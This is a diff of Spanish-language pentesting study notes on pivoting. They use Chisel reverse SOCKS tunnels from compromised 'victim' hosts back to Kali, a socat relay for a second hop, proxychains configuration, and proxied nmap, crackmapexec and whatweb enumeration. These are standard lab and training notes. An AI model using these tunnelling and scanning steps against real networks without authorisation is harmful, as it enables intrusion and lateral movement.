@@ -1,6 +1,6 @@
 # Pivoting con Chisel
 
-Tags: #Chisel #PortForwarding #LocalForwarding #DinamicForwarding #Pivoting 
+Tags: #Chisel #DinamicForwarding #RemoteForwarding #Pivoting 
 
 Permite redirigir todo el tráfico entrante de un puerto local hacia un puerto remoto.
 
@@ -8,10 +8,10 @@ Permite redirigir todo el tráfico entrante de un puerto local hacia un puerto r
 * **Cliente -> Kali**
 
 ```bash
-1. Descargar el binario 'Chisel' desde los 'Releases'
+1. Descargar el binario 'Chisel' desde los 'Releases' para Windows o Linux
 ❯ https://github.com/jpillora/chisel
 
-
+# En Linux 
 2. Reducir el tamaño al binario 'Chisel' para una transferencia más rapida
 ❯ du -hc chisel                   # Mirar el peso del binario
 ❯ upx Chisel                      # Reducir el tamaño del binario 
@@ -54,12 +54,10 @@ Nota: Se crea un túnel utilizando un solo puerto con una IP especifica
 	# IP-Server = IP de Kali
 	# Port-Server = Puerto de Kali
 	# R = Remote Port Forwarding
-     # socks = Abre el puerto 1080 de Kali y crea un tunel para llegar a la maquina víctima 
+     # socks = Abre el puerto 1080 de Kali y crea un túnel para llegar a la máquina víctima 
 
-Nota: Se crea un túnel recibiendo todos los puertos de todos los segmentos de red
+Nota: Se crea un túnel recibiendo todas las conexiones de los segmentos de red al que queremos acceder 
 ```
-
-## Archivo a modificar después de crear el túnel 
 
 ```bash 
 # Hacer los siguientes cambios después de crear el túnel 
@@ -67,26 +65,51 @@ Nota: Se crea un túnel recibiendo todos los puertos de todos los segmentos de r
 ❯ nvim /etc/proxychains.conf 
 
 Nota: 
-1. Deshabilitar comentando 'Dinamic_chain' ya que solo se habilita cuando se va a pasar por varios tuneles
-2. Habilitar descomentando 'strick_chain' ya que solo se habilita cuando tenemos un túnel 
+1. Deshabilitar comentando 'Dinamic_chain' ya que solo se habilita cuando se tienen varios tuneles
+2. Habilitar descomentando 'Strick_chain' ya que solo se habilita cuando tenemos un solo túnel 
 3. Hasta abajo del archivo agregar lo siguiente:
 
-	sock5 127.0.0.1 1080 
+	socks5 127.0.0.1 1080 
 	
 ```
 
-## 2. Dinamic Port Forwarding 
+## 2. Dinamic Port Forwarding para tener dos túneles 
 
 ```bash 
-❯ ssh -D 1080 user@IP               # Conectarse por SSH creando un túnel dinámico en la máquina local. Por lo que cualquier conexión de red al puerto 1080 en tu computadora se redirigirá a través de la sesión SSH al servidor remoto
+Nota:
+	1. Este se utiliza cuando queremos más de un túnel
+	2. Crear un segundo túnel desde la segunda máquina víctima hacia la primer máquina víctima que contiene el primer túnel
 
-❯ netstat -ant | grep 1080          # Verificar la creación del túnel de manera local (modo: LISTENING)
+
+❯ socat TCP-LISTEN:4455,fork TCP:<IP-Server>:1234            # Server 'Maquina víctima con el primer túnel' 
+
+	# TCP-LISTEN = Escuchar en el puerto 4455
+	# TCP:<IP-Server>:1234 = Redirigir el tráfico al destino 'Kali' y en el puerto '1234' configurado en el primer túnel
+	# <IP-Server> = IP de Kali
+
+❯ .\chisel.exe client <IP-1erTunel>:4455 R:8888:socks        # Cliente 'Segunda maquina víctima'
+
+	# IP-1erTunel = IP de la maquina víctima que tiene configurado el primer túnel
+	# Port-Server = Puerto a abrir 
+	# R = Remote Port Forwarding
+     # socks = Abre el puerto 8888 de la maquina con el primer túnel y crea el segundo túnel 
+
+
+Nota: Se crea un túnel recibiendo todas las conexiones de los segmentos de red al que queremos acceder 
 ```
 
 ```bash 
+# Hacer los siguientes cambios en el archivo después de crear el segundo túnel 
+
 ❯ nano /etc/proxychains.conf        # Modificar el archivo 'proxychains' y agregar lo siguiente:
 
-	socks4 127.0.0.1 1080          # Comentar (# proxy_dns) y modificar el proxy en 'ProxyList'
+Nota: 
+1. Habilitar descomentando 'Dinamic_chain' ya que solo se habilita cuando se tienen varios tuneles
+2. Dehabilitar comentando 'Strick_chain' ya que solo se habilita cuando tenemos un solo túnel 
+3. Hasta abajo del archivo agregar lo siguiente en este orden:
+
+	socks5 127.0.0.1 8888          # Primero se agrega el segundo túnel
+	socks5 127.0.0.1 1080          # Despues se agrega el primer túnel 
 ```
 
 ## 3. Comandos con Proxychains
@@ -102,6 +125,8 @@ Siempre se debe colocar 'proxychains' antes de cada comando por lo que hará el 
 ❯ proxychains nmap --top-ports 500 --open -T5 -v -n <IP> -sT -Pn -oG allports 2>&1 | grep -vE "timeout|OK"
 ❯ proxychains nmap -sT -Pn -sCV -p22,.. <IP> -oN Targeted | grep -vE "timeout|OK"
 
+- CRACKMAPEXEC 
+❯ proxychains crackmapexec smb IP 2>/dev/null    # Enumeración del SMB
 
 - WHATWEB
 ❯ proxychains whatweb IP          # Escaneo hacia la maquina víctima 
